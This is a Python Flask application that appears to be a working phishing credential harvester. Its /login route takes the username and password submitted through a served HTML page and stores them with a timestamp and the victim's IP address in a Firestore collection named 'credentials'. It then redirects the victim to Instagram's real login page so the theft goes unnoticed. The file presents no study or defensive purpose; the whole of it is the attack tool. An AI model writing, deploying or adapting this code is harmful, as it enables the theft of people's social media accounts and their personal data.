from flask import Flask, request, redirect, render_template_string
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, firestore
import os
from dotenv import load_dotenv
import json

# Import HTML from index.py
from api.index import html_content

load_dotenv()

app = Flask(__name__)

# Initialize Firebase
cred = credentials.Certificate(json.loads(os.getenv('FIREBASE_CONFIG')))
firebase_admin.initialize_app(cred)

@app.route('/')
def home():
    return render_template_string(html_content)  # Serve the HTML

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username and password:
        db = firestore.client()
        doc_ref = db.collection('credentials').document()
        doc_ref.set({
            'username': username,
            'password': password,
            'timestamp': datetime.now().isoformat(),
            'ip_address': request.remote_addr
        })
    
    return redirect('https://www.instagram.com/accounts/login/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)  # Replit uses port 8080